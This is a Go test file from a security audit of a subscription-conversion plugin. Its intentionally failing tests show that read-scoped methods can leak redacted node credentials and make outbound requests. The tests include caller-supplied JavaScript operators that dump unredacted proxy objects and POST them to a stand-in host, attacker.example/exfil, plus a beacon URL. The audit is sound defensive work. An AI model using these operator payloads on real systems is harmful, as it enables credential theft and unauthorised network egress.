package main

// Scope-boundary audit (audit/sidecars, 2026-08-19).
//
// The signed manifest is the ONLY thing that decides who may reach a method:
// this process never sees the caller's scopes, so a method's declared scope has
// to bound the privilege that method can actually exercise. These tests assert
// that property for the three methods the manifest declares at `substore:read`
// and that turn out to exercise more than a read.
//
// Every test here FAILS on the tree it was written against. Each failure is the
// finding, not a flake.
//
// Manifest (0.13.0-alpha.14) for reference:
//   latticenet.sub-store/engine.convert          scopes: [substore:read]
//   latticenet.sub-store/subscription.preview    scopes: [substore:read]
//   latticenet.sub-store/subscription.fetch      scopes: [substore:admin]
//   latticenet.sub-store/subscription.render     scopes: [substore:admin]

import (
	"encoding/base64"
	"encoding/json"
	"strings"
	"testing"

	latticeplugin "github.com/LatticeNet/lattice-sdk/plugin"
)

// auditNode's userinfo base64-decodes to "aes-128-gcm:supersecret", so the
// parsed proxy object carries password="supersecret".
const auditNode = "ss://YWVzLTEyOC1nY206c3VwZXJzZWNyZXQ=@node.example.com:8388#Prod"

const auditSecret = "supersecret"

// auditInvocation reproduces what invocationHandler does per invocation
// (main.go:153-164): one runtime bound to the host, with the script HTTP
// gateway attached for the whole call.
func auditInvocation(t *testing.T, host hostCaller) (*runtime, func()) {
	t.Helper()
	engine := newTestEmbeddedSubStoreEngine()
	rt := &runtime{engine: engine, host: host}
	return rt, engine.attachScriptHTTP(newScriptHTTPGateway(rt.host))
}

func auditCall(t *testing.T, rt *runtime, service, method string, payload map[string]any) response {
	t.Helper()
	raw, err := json.Marshal(payload)
	if err != nil {
		t.Fatalf("encode payload: %v", err)
	}
	return rt.handle(request{
		Action:  latticeplugin.ActionCall,
		Service: pluginID + "/" + service,
		Method:  method,
		Payload: raw,
	})
}

func auditScriptOperator(t *testing.T, body string) json.RawMessage {
	t.Helper()
	raw, err := json.Marshal(map[string]any{
		"type": "Script Operator",
		"args": map[string]any{"mode": "script", "content": body},
	})
	if err != nil {
		t.Fatalf("encode operator: %v", err)
	}
	return raw
}

// FINDING 1 — preview's credential redaction is bypassable by the caller.
//
// previewSubscription reduces every node to nodeSummary precisely so a preview
// "cannot double as a credential dump" (subscription_preview.go:9-18): no
// password, uuid, key or SNI. But the operator chain runs over the FULL proxy
// objects before that reduction (subscription_preview.go:117), and the caller
// supplies the chain. A Script Operator therefore reads the unredacted node and
// writes the secret into a field that is returned.
//
// Caller: anyone holding substore:read. Gets: the credentials the redaction was
// written to withhold.
func TestPreviewRedactionHoldsAgainstACallerSuppliedOperator(t *testing.T) {
	rt, release := auditInvocation(t, nil)
	defer release()

	lift := auditScriptOperator(t, `function operator(proxies) {
		return proxies.map(p => ({ ...p, name: JSON.stringify(p) }));
	}`)

	resp := auditCall(t, rt, "subscription", "preview", map[string]any{
		"raw":       auditNode,
		"target":    "URI",
		"operators": []json.RawMessage{lift},
	})
	if !resp.OK {
		t.Fatalf("preview failed: %s", resp.Error)
	}
	if strings.Contains(string(resp.Result), auditSecret) {
		t.Fatalf("a substore:read caller read a node credential out of a redacted preview: %s", resp.Result)
	}
}

// The same call without an operator is the control: it must stay redacted, so a
// failure above is the operator chain and nothing else.
func TestPreviewWithoutOperatorsWithholdsTheCredential(t *testing.T) {
	rt, release := auditInvocation(t, nil)
	defer release()

	resp := auditCall(t, rt, "subscription", "preview", map[string]any{
		"raw": auditNode, "target": "URI",
	})
	if !resp.OK {
		t.Fatalf("preview failed: %s", resp.Error)
	}
	if strings.Contains(string(resp.Result), auditSecret) {
		t.Fatalf("baseline preview leaked the credential: %s", resp.Result)
	}
}

// FINDING 2 — preview performs an outbound fetch to a caller-chosen URL.
//
// subscription_render.go:800-814 resolves an unsaved draft's source live, using
// the caller's own `url` and `ua`. That is the same http.do egress the `fetch`
// method exists to perform, and `fetch` is declared substore:admin.
//
// Caller: anyone holding substore:read. Gets: the control plane issuing a GET to
// a host of their choosing, with a User-Agent of their choosing, and the
// response body parsed back to them.
func TestPreviewDoesNotFetchACallerSuppliedURL(t *testing.T) {
	host := &httpKVHost{kvHostCaller: newKVHostCaller(), status: 200, body: []byte(auditNode)}
	rt, release := auditInvocation(t, host)
	defer release()

	resp := auditCall(t, rt, "subscription", "preview", map[string]any{
		"source": "provider",
		"url":    "https://attacker.example/beacon?id=1",
		"ua":     "audit-chosen-agent/1.0",
		"target": "URI",
	})
	if !resp.OK {
		t.Fatalf("preview failed: %s", resp.Error)
	}
	if host.calls != 0 {
		t.Fatalf("a substore:read caller drove %d outbound request(s) with UA %q; that egress is declared substore:admin on `fetch`",
			host.calls, host.ua)
	}
}

// FINDING 3 — convert gives a read-scoped caller arbitrary outbound HTTP.
//
// invocationHandler attaches the script HTTP gateway for EVERY invocation
// (main.go:160), and engine.convert accepts a caller-supplied operator chain
// including "Script Operator" (operators.go:44-47), which runs that JavaScript
// with globalThis.$httpClient wired to http.do (substore_script_env.go:94).
//
// Caller: anyone holding substore:read. Gets: up to scriptHTTPMaxCalls (8)
// requests per invocation, with a method, headers and body of their choosing,
// carrying whatever the script could read.
func TestConvertDoesNotGiveAReadScopedCallerTheNetwork(t *testing.T) {
	host := &scriptHTTPHost{body: []byte("ok")}
	rt, release := auditInvocation(t, host)
	defer release()

	exfil := auditScriptOperator(t, `async function operator(proxies) {
		await $substore.http.post({
			url: "https://attacker.example/exfil",
			body: JSON.stringify(proxies),
			timeout: 5000,
		});
		return proxies;
	}`)

	resp := auditCall(t, rt, "engine", "convert", map[string]any{
		"raw":       auditNode,
		"target":    "URI",
		"operators": []json.RawMessage{exfil},
	})
	if !resp.OK {
		t.Fatalf("convert failed: %s", resp.Error)
	}

	seen := host.seen()
	if len(seen) == 0 {
		return
	}
	// Name what left, so the failure is evidence rather than a count.
	leaked := false
	for _, req := range seen {
		encoded, _ := req["body_base64"].(string)
		body, err := base64.StdEncoding.DecodeString(encoded)
		if err == nil && strings.Contains(string(body), auditSecret) {
			leaked = true
		}
	}
	t.Fatalf("a substore:read caller drove %d outbound request(s) to %v; node credentials in the body: %v",
		len(seen), seen[0]["url"], leaked)
}
